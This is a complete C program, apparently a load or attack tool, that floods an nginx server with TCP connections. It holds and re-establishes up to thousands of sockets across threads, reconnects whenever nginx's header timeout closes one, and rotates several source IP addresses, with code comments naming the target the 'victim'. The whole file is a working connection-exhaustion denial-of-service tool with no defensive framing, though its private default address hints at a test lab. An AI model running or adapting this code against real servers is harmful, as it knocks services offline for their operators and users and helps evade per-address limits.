#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <ifaddrs.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <stdbool.h>
#include <err.h>
#include <getopt.h>
#define NGINX_HEADER_TIMEOUT_SEC	(60)	
#define DEFAULT_SRC_IPS_COUNT 	(1)
#define DEFAULT_SRC_IFACE	"epair0b"
#define DEFAULT_CONNECTIONS	(1000)
#define DEFAULT_DST_IP		"10.134.23.123"
#define DEFAULT_DST_PORT	(443)
#define DEFAULT_THREADS		(10)

pthread_mutex_t lock_stat_counter;
struct flood_args {
	unsigned int fds_size;			// each file descriptor respresents TCP connections
	struct sockaddr * dst_saddr;		// contains dst ip address
	struct sockaddr * src_saddrs;		// contains src ip addresses
	unsigned int src_ips_size;		// rotate this amount of src ips 
};

struct _opt {
	int src_ips_count;			 
	char src_iface_name[20];		// source interface
	unsigned int connections;		// TCP connections to hold
	int threads; 				// threads to generate load
	char dst_ip[20];			// target ip
	unsigned int dst_port;			// target port
	_Bool reconnect;
};
struct _opt g_opt;


// open tcp connection and return socket file descriptor
int tcp_open(struct sockaddr* src, struct sockaddr* dst){
	int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd < 0){
		warnx("%d: %s: error opening socket", errno, strerror(errno));
		close(fd);
		return -1;
	}
	if (bind(fd, src, sizeof(struct sockaddr)) != 0){
		warnx("%d: %s: error binding", errno, strerror(errno));
		close(fd);
		return -1;
	}
	if (connect(fd, dst, sizeof(struct sockaddr)) != 0){
		char* dst_ip = inet_ntoa(((struct sockaddr_in *)dst)->sin_addr);
		int dst_port = htons(((struct sockaddr_in *)dst)->sin_port);
		warnx("%d: %s %s:%d", errno, strerror(errno), dst_ip, dst_port);
		close(fd);
		return -1;
	}
	return fd;
}

// close tcp connections, decrement statistic counter
void tcp_close(int fd){
	close(fd);
}

//open many tcp connections and reconnect after nginx "header_timeout"
void *flood(void* args){
	struct flood_args * flood_args = (struct flood_args *) args;
	struct pollfd *pfds;
	pfds = calloc(flood_args->fds_size, sizeof(struct pollfd));
	for (int i = 0; i < flood_args->fds_size; i++){			// establish TCP connections in this cycle
		int src_ip_index = i % flood_args->src_ips_size;
		struct sockaddr src = flood_args->src_saddrs[src_ip_index];
		pfds[i].fd = tcp_open(&src, flood_args->dst_saddr);
		pfds[i].events = POLLIN;
	}
	while (1){
		int ready;
		// After "header_timeout" nginx responds with FIN and pfds[i].fd becomes readable.
		// "ready" equals amount of readable sockets in fd set pfds
		ready = poll(pfds, flood_args->fds_size, NGINX_HEADER_TIMEOUT_SEC * 1000);	
		if(ready == 0){  // poll timeout exit
			continue;
		}	
		if (ready == -1){
			err(EXIT_FAILURE, "%d: %s : poll error", errno, strerror(errno));
		}
		for (int i = 0; i < flood_args->fds_size; i++){  			// looking for a readable pfds[i]
			if (pfds[i].fd > 0 && pfds[i].revents & POLLIN){
				tcp_close(pfds[i].fd);		 			// close socket
				int src_ip_index = i % flood_args->src_ips_size;
				struct sockaddr src = flood_args->src_saddrs[src_ip_index];
				pfds[i].fd = tcp_open(&src, flood_args->dst_saddr); 	// open new socket
			}
			if (g_opt.reconnect && pfds[i].fd == -1){
				int src_ip_index = i % flood_args->src_ips_size;
				struct sockaddr src = flood_args->src_saddrs[src_ip_index];
				pfds[i].fd = tcp_open(&src, flood_args->dst_saddr); 	// open new socket
			}
		}
	}
}

//init src_ips array with OS IP addresses
int init_src_ips(char* src_iface_name, struct sockaddr* src_ips, int src_ips_len){
	struct ifaddrs *start_ifap; 
	struct ifaddrs *current_ifap;
	getifaddrs(&start_ifap);
	current_ifap = start_ifap; 
	int src_ip_index = 0;
	while (current_ifap != NULL){
		if (strcmp(src_iface_name, current_ifap->ifa_name) == 0 && current_ifap->ifa_addr->sa_family==AF_INET){
			memcpy(src_ips + src_ip_index, current_ifap->ifa_addr, sizeof(struct sockaddr)); 
			src_ip_index++;
			if (src_ip_index == src_ips_len){
				break;
			}	
		}
		current_ifap = current_ifap->ifa_next;
	}
	if (src_ip_index <= src_ips_len - 1){
		fprintf(stderr, "Can't initialize %d src ips of %s interface\n", src_ip_index + 1, src_iface_name);
		exit(1);
	}
	freeifaddrs(start_ifap);
	return 0;
}

int init_dst_sockaddr(struct sockaddr * saddr, char* ip, int port){
	struct sockaddr_in * saddr_in = (struct sockaddr_in *) saddr;
	inet_pton(AF_INET, ip, &saddr_in->sin_addr);
	saddr_in->sin_family = AF_INET;
	saddr_in->sin_port = htons(port);
	return 0;

}

void init_default_values(){
	g_opt.src_ips_count = DEFAULT_SRC_IPS_COUNT;
	strncpy(g_opt.src_iface_name, DEFAULT_SRC_IFACE, 20);
	g_opt.connections = DEFAULT_CONNECTIONS;
	g_opt.threads = DEFAULT_THREADS;
	strncpy(g_opt.dst_ip, DEFAULT_DST_IP, 20);
	g_opt.dst_port = DEFAULT_DST_PORT;
	g_opt.reconnect = false;
}
	
void usage(char** argv){
	fprintf(stdout, ""
			"%s [ -i %s -n %d -c %d -t %d -d %s -p %d]\n"
			"\t-i interface name\n"
			"\t-n rotate this amount of source ips aliased to \"-i interface\"\n"
			"\t-c connections to hold\n"
		        "\t-t threads\n"
			"\t-d destination ip\n"
			"\t-p port\n"
			"\t-r reconnect broken sockets [experimental]\n",
			argv[0], DEFAULT_SRC_IFACE, DEFAULT_SRC_IPS_COUNT, DEFAULT_CONNECTIONS, DEFAULT_THREADS,
			DEFAULT_DST_IP, DEFAULT_DST_PORT);
	exit(1);
}

void do_user_input(int argc, char*argv[]){
	init_default_values();
	int c;
	int option_index = 0;
	while (( c = getopt_long(argc, argv, "hrn:i:c:t:d:p:", NULL, &option_index)) != -1){
		switch(c){
			case 'n':
				g_opt.src_ips_count = atoi(optarg);
				break;
			case 'i':
				strncpy(g_opt.src_iface_name, optarg, 20);
				break;
			case 'c':
				g_opt.connections = atoi(optarg);
				break;
			case 't':
				g_opt.threads = atoi(optarg);
				break;
			case 'd':
				strncpy(g_opt.dst_ip, optarg, 20);
				break;
			case 'p':
				g_opt.dst_port = atoi(optarg);
				break;
			case 'r':
				g_opt.reconnect = true;
				break;
			case 'h':
			default:
				usage(argv);
		}
	}
}


int main(int argc, char *argv[]){
	do_user_input(argc, argv);
	fprintf(stdout, "Establish %d TCP connections with %s:%d\n"
			"Use %d ips of %s interface\n", 
			 g_opt.connections, g_opt.dst_ip, g_opt.dst_port, g_opt.src_ips_count, g_opt.src_iface_name);


	// init src IPs
	struct sockaddr * src_ips;
	src_ips = (struct sockaddr *)calloc(g_opt.src_ips_count, sizeof(struct sockaddr));
	init_src_ips(g_opt.src_iface_name, src_ips, g_opt.src_ips_count);

	//init victim's dst IP
	struct sockaddr * target = (struct sockaddr *) malloc(sizeof(struct sockaddr));
	memset(target, 0, sizeof(struct sockaddr));
	init_dst_sockaddr(target, g_opt.dst_ip, g_opt.dst_port);
	
	struct flood_args flood_args; 
	flood_args.src_saddrs = src_ips;
	flood_args.src_ips_size = g_opt.src_ips_count; 
	flood_args.dst_saddr = target;
	flood_args.fds_size = g_opt.connections/g_opt.threads;		// divide connections between threads
	
	//start tcp connection flood
	pthread_t pthreads[g_opt.threads];
	for (int i = 0; i < g_opt.threads; i++){
		if (pthread_create(&pthreads[i], NULL, flood, &flood_args) == 0){
			printf("Thread %02d created: hold %d connections\n", i+1, flood_args.fds_size);
		}else{
			err(EXIT_FAILURE, "%s\n", "Error creating thread");
		}
	}
	for (int i = 0; i < g_opt.threads; i++){
		pthread_join(pthreads[i], NULL);
	}
	return 0;
}
